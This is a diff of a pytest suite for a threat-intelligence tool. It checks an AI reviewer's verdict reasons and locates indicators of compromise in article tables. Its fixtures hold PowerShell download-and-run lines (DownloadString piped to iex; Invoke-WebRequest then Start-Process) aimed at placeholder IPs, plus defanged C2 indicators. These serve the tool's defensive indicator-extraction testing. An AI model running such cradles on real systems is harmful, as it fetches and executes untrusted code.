@@ -508,7 +508,10 @@ def test_validate_voids_one_reason_copied_onto_several_links():
     items = [_item(f"link:sector:{n}", entity_type="sector") for n in "abc"] + [
         _item("link:vendor:d", entity_type="vendor")
     ]
-    pasted = "The context line is a 'Related' link to an article about Tailscale patching."
+    for it, name in zip(items, ("Energy", "Finance", "Retail"), strict=False):
+        it.name = name
+    # Each sector is named, so only the copying voids them.
+    pasted = "A 'Related' link about Tailscale patching names Energy, Finance and Retail, not the victims."
     verdicts, stats = _validate_verdicts(
         {
             "verdicts": [
@@ -516,7 +519,12 @@ def test_validate_voids_one_reason_copied_onto_several_links():
                     {"item_id": f"link:sector:{n}", "verdict": "remove", "confidence": "high", "reason": pasted}
                     for n in "abc"
                 ),
-                {"item_id": "link:vendor:d", "verdict": "remove", "confidence": "high", "reason": "Ad banner only."},
+                {
+                    "item_id": "link:vendor:d",
+                    "verdict": "remove",
+                    "confidence": "high",
+                    "reason": "link:vendor:d is an ad banner only.",
+                },
             ]
         },
         items,
@@ -657,6 +665,252 @@ def test_validate_reclassify_reason_must_name_the_item():
     assert verdicts[0].verdict == "reclassify"  # a matched form counts
 
 
+def test_validate_remove_and_demote_reasons_must_name_their_item():
+    # Reasons pasted onto the wrong row: a MANTLEMAZE → Cairn demote that
+    # explains Warlock; a VMware NSX unlink that talks about Infoblox.
+    edge = ReviewItem(
+        item_id="edge:m",
+        kind="edge",
+        line="",
+        name="MANTLEMAZE uses Cairn (malware)",
+        edge_id=uuid.uuid4(),
+        forms=["MANTLEMAZE", "Cairn"],
+    )
+    nsx = ReviewItem(
+        item_id="link:product:nsx",
+        kind="link",
+        line="",
+        entity_type="product",
+        entity_id=uuid.uuid4(),
+        name="VMware NSX",
+        matched_names=["NSX"],
+    )
+    ttp = ReviewItem(
+        item_id="link:ttp:t",
+        kind="link",
+        line="",
+        entity_type="ttp",
+        entity_id=uuid.uuid4(),
+        name="T1059.001 PowerShell",
+        matched_names=["the loader runs a PowerShell one-liner"],
+        forms=["T1059.001", "PowerShell"],
+    )
+
+    def verdicts_for(reasons):
+        out, stats = _validate_verdicts(
+            {
+                "verdicts": [
+                    {"item_id": it.item_id, "verdict": v, "confidence": "high", "reason": r}
+                    for it, v, r in zip((edge, nsx, ttp), ("demote", "remove", "remove"), reasons, strict=True)
+                ]
+            },
+            [edge, nsx, ttp],
+        )
+        return out, stats
+
+    wrong, stats = verdicts_for(
+        [
+            "The sentence only says Warlock ransomware was deployed.",
+            "Infoblox Threat Defense is the product discussed, not this one.",
+            "",
+        ]
+    )
+    assert [v.verdict for v in wrong] == ["keep", "keep", "keep"]
+    assert not any(v.explicit for v in wrong)  # a voided demote is no corroborating keep
+    assert stats["unnamed_reason"] == 3
+
+    right, stats = verdicts_for(
+        [
+            "Cairn is never tied to MANTLEMAZE; they share a roundup paragraph.",
+            "NSX here is a file extension, not the VMware product.",
+            "t1059.001 is only in a footnote link.",
+        ]
+    )
+    assert [v.verdict for v in right] == ["demote", "remove", "remove"]
+    assert stats["unnamed_reason"] == 0
+
+
+def test_reason_names_item_compares_words_not_punctuation():
+    item = ReviewItem(item_id="link:malware:n", kind="link", line="", name="NetSupport RAT")
+    assert adj._reason_names_item("'NetSupport-RAT' appears only in a Related headline.", item)
+    assert not adj._reason_names_item("NetSupport Manager, the admin tool, is meant.", item)
+
+
+@pytest.mark.parametrize(
+    ("reason", "affirms"),
+    [
+        ("The article explicitly states MANTLEMAZE uses Cairn, validating the edge.", True),
+        ("The evidence sentence supports the relationship between Cairn and MANTLEMAZE.", True),
+        ("The domain evil.example is a valid indicator listed in the IoC table.", True),
+        ("Cairn link should be kept.", True),
+        ("Nothing in the article validates the edge between Cairn and MANTLEMAZE.", False),
+        ("The article does not support the claim that MANTLEMAZE uses Cairn.", False),
+        ("Cairn is a place name. Validating requires a stated use.", True),
+        ("Cairn here is a Scottish landmark, not the malware.", False),
+    ],
+)
+def test_reason_affirms(reason, affirms):
+    assert adj._reason_affirms(reason) is affirms
+
+
+def test_validate_drops_destructive_verdicts_whose_reason_argues_for_the_record():
+    edge = ReviewItem(
+        item_id="edge:m", kind="edge", line="", name="c", edge_id=uuid.uuid4(), forms=["MANTLEMAZE", "Cairn"]
+    )
+    ioc = _item("ioc:domain:evil.example", kind="ioc")
+    verdicts, stats = _validate_verdicts(
+        {
+            "verdicts": [
+                {
+                    "item_id": edge.item_id,
+                    "verdict": "demote",
+                    "confidence": "high",
+                    "reason": "The article explicitly states MANTLEMAZE uses Cairn, validating the edge.",
+                },
+                {
+                    "item_id": ioc.item_id,
+                    "verdict": "drop",
+                    "confidence": "high",
+                    "reason": "evil.example is a valid indicator in the IoC table.",
+                },
+            ]
+        },
+        [edge, ioc],
+    )
+    assert [v.verdict for v in verdicts] == ["keep", "keep"]
+    assert not any(v.explicit for v in verdicts)
+    assert stats["affirming_reason"] == 2
+
+
+# ------------------------------------------------------------------ where an item sits
+
+IOC_ARTICLE = """The campaign used a loader. Note: re-fang 45.77.12[.]9 only in VirusTotal or MISP.
+
+The dropper was saved as T1059.001-run.ps1 before the payload ran, a step we describe at length below so that this
+paragraph is long enough to read as prose rather than a list of indicators.
+
+## Indicators of Compromise
+
+Indicator | Type | Description
+45.77.12[.]9 | IPv4 | C2 server
+hxxps://evil-cdn[.]com/a.php | URL | payload host
+
+## Sample hashes
+
+- 5d41402abc4b2a76b9719d911017c592
+- 7d793037a0760186574b0282f2f435e7
+
+## MITRE ATT&CK
+
+Tactic | Technique | ID
+Execution | PowerShell | T1059.001
+"""
+
+
+def test_ioc_where_prefers_the_indicator_table_row_over_the_first_mention():
+    # The first literal occurrence is the "re-fang only in VirusTotal" note;
+    # the item line must point at the IoC table instead, defanged form found.
+    where = adj._ioc_where(IOC_ARTICLE, "45.77.12.9", None)
+    assert 'table row under "Indicators of Compromise"' in where
+    assert "the article's indicator section" in where
+    assert '"45.77.12[.]9 | IPv4 | C2 server"' in where
+    assert "table header: Indicator | Type | Description" in where
+    url = adj._ioc_where(IOC_ARTICLE, "https://evil-cdn.com/a.php", None)
+    assert "hxxps://evil-cdn[.]com/a.php | URL | payload host" in url
+
+
+def test_ioc_where_finds_a_hash_list_line_and_says_nothing_when_absent():
+    where = adj._ioc_where(IOC_ARTICLE, "5d41402abc4b2a76b9719d911017c592", None)
+    assert 'list item under "Sample hashes"' in where
+    assert adj._ioc_where(IOC_ARTICLE, "0" * 64, None) == ""
+    # A value is a whole token: a hash prefix inside a longer hex string is no match.
+    assert adj._ioc_where(IOC_ARTICLE, "5d41402abc4b2a76", None) == ""
+
+
+def test_ttp_listed_in_attack_table_not_the_file_name():
+    pattern = adj._technique_pattern("T1059.001")
+    row = adj._locate(IOC_ARTICLE, [pattern], structured_only=True)
+    assert row.startswith('table row under "MITRE ATT&CK"')
+    assert '"Execution | PowerShell | T1059.001"' in row
+    # Prose only (the file name) is not a listing.
+    assert adj._locate(IOC_ARTICLE.split("## Indicators")[0], [pattern], structured_only=True) == ""
+    # A parent technique finds its sub-technique row; a different id does not.
+    assert adj._locate(IOC_ARTICLE, [adj._technique_pattern("T1059")], structured_only=True)
+    assert adj._locate(IOC_ARTICLE, [adj._technique_pattern("T1003")], structured_only=True) == ""
+    assert adj._technique_pattern("not an id") is None
+
+
+def test_script_lines_carry_the_code_not_just_the_hash():
+    code = "$c = New-Object Net.WebClient\n$c.DownloadString('http://198.51.100.7/s.ps1') | iex"
+    text = "The stager:\n\n$c = New-Object Net.WebClient\n$c.DownloadString('http://198.51.100.7/s.ps1') | iex\n"
+    lines = adj._script_lines(text, code, "stager", "powershell")
+    assert 'script (powershell) "stager": "$c = New-Object Net.WebClient $c.DownloadString(' in lines
+    assert 'found in: line of its own: "$c = New-Object Net.WebClient"' in lines
+    assert adj._script_lines(text, "", "stager", None) == '\n    script "stager" (code not stored)'
+
+
+@pytest.mark.asyncio
+async def test_manifest_ioc_and_script_items_carry_their_context(db_session: AsyncSession, feed):
+    from app.intelligence.observables import script_identity
+    from app.models.observable import EntryObservable, Observable
+
+    entry = await _make_entry(db_session, feed)
+    entry.content_text = IOC_ARTICLE
+    code = "$c = New-Object Net.WebClient\n$c.DownloadString('http://198.51.100.7/s.ps1') | iex"
+    captured_code = "Invoke-WebRequest -Uri http://203.0.113.9/p.bin -OutFile $env:TEMP\\p.exe; Start-Process p.exe"
+    ip = Observable(kind="ipv4", value="45.77.12.9", sighting_count=1, article_count=1)
+    script = Observable(
+        kind="script",
+        value=script_identity(captured_code)[0],
+        content=captured_code,
+        label="downloader",
+        language="powershell",
+        sighting_count=1,
+        article_count=1,
+    )
+    db_session.add_all([ip, script])
+    await db_session.flush()
+    db_session.add_all(
+        [
+            EntryObservable(
+                entry_id=entry.id,
+                observable_id=ip.id,
+                source="ai",
+                surface_form="45.77.12[.]9",
+                was_defanged=True,
+            ),
+            EntryObservable(entry_id=entry.id, observable_id=script.id, source="ai"),
+        ]
+    )
+    staged_sha = script_identity(code)[0]
+    entry.observable_candidates = [
+        {"kind": "script", "value": staged_sha, "surface_form": "stager", "origin": "ai"},
+    ]
+    await db_session.flush()
+
+    payload = _payload(scripts=[{"code": code, "label": "stager", "language": "powershell"}])
+    items, _ = await build_manifest(db_session, entry, payload)
+    by_id = {it.item_id: it for it in items}
+    assert 'found in: table row under "Indicators of Compromise"' in by_id["ioc:ipv4:45.77.12.9"].line
+    assert 'script (powershell) "downloader": "Invoke-WebRequest' in by_id[f"ioc:script:{script.value}"].line
+    assert 'script (powershell) "stager": "$c = New-Object' in by_id[f"ioc:script:{staged_sha}"].line
+
+
+@pytest.mark.asyncio
+async def test_manifest_ai_ttp_shows_its_attack_table_row(db_session: AsyncSession, feed):
+    entry = await _make_entry(db_session, feed)
+    entry.content_text = IOC_ARTICLE
+    ttp = TTP(technique_id="T1059.001", technique_name="PowerShell", tactic="execution")
+    db_session.add(ttp)
+    await db_session.flush()
+    db_session.add(EntryTTP(entry_id=entry.id, ttp_id=ttp.id, confidence="high", source_text="T1059.001-run.ps1"))
+    await db_session.flush()
+    items, _ = await build_manifest(db_session, entry, _payload())
+    t = next(it for it in items if it.entity_type == "ttp")
+    assert t.forms == ["T1059.001", "PowerShell"]
+    assert 'listed in: table row under "MITRE ATT&CK"' in t.line
+
+
 def test_validate_reclassify_needs_valid_type():
     item = _item("link:threat_actor:a")
     ok, _ = _validate_verdicts(
@@ -736,7 +990,7 @@ async def test_shadow_writes_proposals_and_mutates_nothing(db_session: AsyncSess
                 "item_id": f"link:threat_actor:{storm.id}",
                 "verdict": "remove",
                 "confidence": "high",
-                "reason": "weather",
+                "reason": "Storm here is the weather",
             },
             {"item_id": f"link:threat_actor:{victim.id}", "verdict": "veto", "confidence": "high", "reason": "victim"},
             {
@@ -745,8 +999,18 @@ async def test_shadow_writes_proposals_and_mutates_nothing(db_session: AsyncSess
                 "confidence": "high",
                 "merge_into": "Storm",
             },
-            {"item_id": f"link:tool:{cobalt.id}", "verdict": "remove", "confidence": "medium", "reason": "advice"},
-            {"item_id": f"edge:{edge.id}", "verdict": "demote", "confidence": "medium", "reason": "generic advice"},
+            {
+                "item_id": f"link:tool:{cobalt.id}",
+                "verdict": "remove",
+                "confidence": "medium",
+                "reason": "Cobalt Strike only in generic advice",
+            },
+            {
+                "item_id": f"edge:{edge.id}",
+                "verdict": "demote",
+                "confidence": "medium",
+                "reason": "Cobalt Strike only in generic advice",
+            },
             {
                 "item_id": "ioc:domain:blog.vendor-research.example",
                 "verdict": "drop",
@@ -799,7 +1063,17 @@ async def test_positive_evidence_override_keeps_extracted_names(db_session: Asyn
     warlock = await _link_actor(db_session, entry, "Warlock")
     items, _ = await build_manifest(db_session, entry, _payload())
     verdicts, _ = _validate_verdicts(
-        {"verdicts": [{"item_id": f"link:threat_actor:{warlock.id}", "verdict": "remove", "confidence": "high"}]}, items
+        {
+            "verdicts": [
+                {
+                    "item_id": f"link:threat_actor:{warlock.id}",
+                    "verdict": "remove",
+                    "confidence": "high",
+                    "reason": "Warlock is a game title",
+                }
+            ]
+        },
+        items,
     )
     cfg = await adj._settings(db_session)
     detail = await apply_verdicts(db_session, entry, verdicts, _payload(threat_actors=[{"name": "Warlock"}]), cfg)
@@ -865,7 +1139,7 @@ async def test_task_reviews_entry_with_stubbed_model(db_session: AsyncSession, f
                     "item_id": f"link:threat_actor:{storm.id}",
                     "verdict": "remove",
                     "confidence": "high",
-                    "reason": "weather",
+                    "reason": "Storm here is the weather",
                 }
             ],
             "assessment": {"verdict": "ok", "reason": ""},
@@ -1076,13 +1350,13 @@ async def test_apply_removes_links_at_high_confidence_and_files_the_rest(db_sess
                 "item_id": f"link:threat_actor:{storm.id}",
                 "verdict": "remove",
                 "confidence": "high",
-                "reason": "weather",
+                "reason": "Storm here is the weather",
             },
             {
                 "item_id": f"link:threat_actor:{warlock.id}",
                 "verdict": "remove",
                 "confidence": "medium",
-                "reason": "hmm",
+                "reason": "Warlock, hmm",
             },
         ],
     )
@@ -1193,7 +1467,12 @@ async def test_apply_demotes_edge_like_the_nightly_job_and_drops_iocs(db_session
         db_session,
         entry,
         [
-            {"item_id": f"edge:{edge.id}", "verdict": "demote", "confidence": "high", "reason": "generic advice"},
+            {
+                "item_id": f"edge:{edge.id}",
+                "verdict": "demote",
+                "confidence": "high",
+                "reason": "Cobalt Strike only in generic advice",
+            },
             {
                 "item_id": "ioc:domain:blog.vendor-research.example",
                 "verdict": "drop",
@@ -1229,8 +1508,13 @@ async def test_apply_breaker_downgrades_whole_run_to_proposals(db_session: Async
         db_session,
         entry,
         [
-            {"item_id": f"link:threat_actor:{a.id}", "verdict": "remove", "confidence": "high"},
-            {"item_id": f"link:threat_actor:{b.id}", "verdict": "remove", "confidence": "high"},
+            {"item_id": f"link:threat_actor:{a.id}", "verdict": "remove", "confidence": "high", "reason": "Storm r"},
+            {
+                "item_id": f"link:threat_actor:{b.id}",
+                "verdict": "remove",
+                "confidence": "high",
+                "reason": "Nightspire r",
+            },
         ],
     )
     cfg = await adj._settings(db_session)  # breaker 0.5; 2/2 destructive trips it
@@ -1263,7 +1547,14 @@ async def test_shadow_runs_never_sample_the_rolling_breaker(db_session: AsyncSes
         _items, verdicts = await _verdicts_for(
             db_session,
             entry,
-            [{"item_id": f"link:threat_actor:{actor.id}", "verdict": "remove", "confidence": "high"}],
+            [
+                {
+                    "item_id": f"link:threat_actor:{actor.id}",
+                    "verdict": "remove",
+                    "confidence": "high",
+                    "reason": f"{actor.name} is weather",
+                }
+            ],
         )
         detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
         assert detail["mode"] == "shadow" and detail["rolling_breaker"] is False
@@ -1353,7 +1644,7 @@ def test_the_reviewer_is_asked_for_changes_only():
     # The clean review: no verdicts at all.
     verdicts, stats = _validate_verdicts({"verdicts": []}, items)
     assert [v.verdict for v in verdicts] == ["keep", "keep", "keep"]
-    assert stats == {"unknown": 0, "coerced": 0, "duplicate": False}
+    assert not stats["duplicate"] and not any(v for k, v in stats.items() if k != "duplicate")
     # And the usual case: one changed item, the rest kept by omission.
     verdicts, _stats = _validate_verdicts(
         {"verdicts": [{"item_id": "ioc:domain:x", "verdict": "drop", "confidence": "high"}]}, items
@@ -2052,8 +2343,18 @@ async def test_a_link_log_restore_shields_the_link_but_a_tool_link_is_not_shield
         db_session,
         entry,
         [
-            {"item_id": f"link:threat_actor:{storm.id}", "verdict": "remove", "confidence": "high", "reason": "x"},
-            {"item_id": f"link:tool:{cobalt.id}", "verdict": "remove", "confidence": "high", "reason": "y"},
+            {
+                "item_id": f"link:threat_actor:{storm.id}",
+                "verdict": "remove",
+                "confidence": "high",
+                "reason": "Storm x",
+            },
+            {
+                "item_id": f"link:tool:{cobalt.id}",
+                "verdict": "remove",
+                "confidence": "high",
+                "reason": "Cobalt Strike y",
+            },
         ],
     )
     by_id = {it.item_id: it for it in items}
@@ -2116,7 +2417,12 @@ async def test_a_failed_merge_does_not_sink_the_rest_of_the_run(db_session: Asyn
                 "merge_into": "Warlock Crew",
                 "confidence": "high",
             },
-            {"item_id": f"link:threat_actor:{storm.id}", "verdict": "remove", "confidence": "high", "reason": "w"},
+            {
+                "item_id": f"link:threat_actor:{storm.id}",
+                "verdict": "remove",
+                "confidence": "high",
+                "reason": "Storm w",
+            },
             {"item_id": f"link:threat_actor:{keep.id}", "verdict": "keep", "confidence": "high"},
         ],
     )
@@ -2261,7 +2567,7 @@ async def test_bulk_apply_and_origin_scoped_dismiss(client, admin_headers, db_se
                 "item_id": f"link:tool:{cobalt.id}",
                 "verdict": "remove",
                 "confidence": "high",
-                "reason": "generic advice",
+                "reason": "Cobalt Strike only in generic advice",
             },
         ],
     )
@@ -2614,7 +2920,7 @@ async def test_edge_promotion_is_not_counted_as_an_applied_change(db_session: As
                 "item_id": f"link:threat_actor:{actor.id}",
                 "verdict": "remove",
                 "confidence": "low",
-                "reason": "unsure",
+                "reason": "Warlock, unsure",
             },
         ],
     )
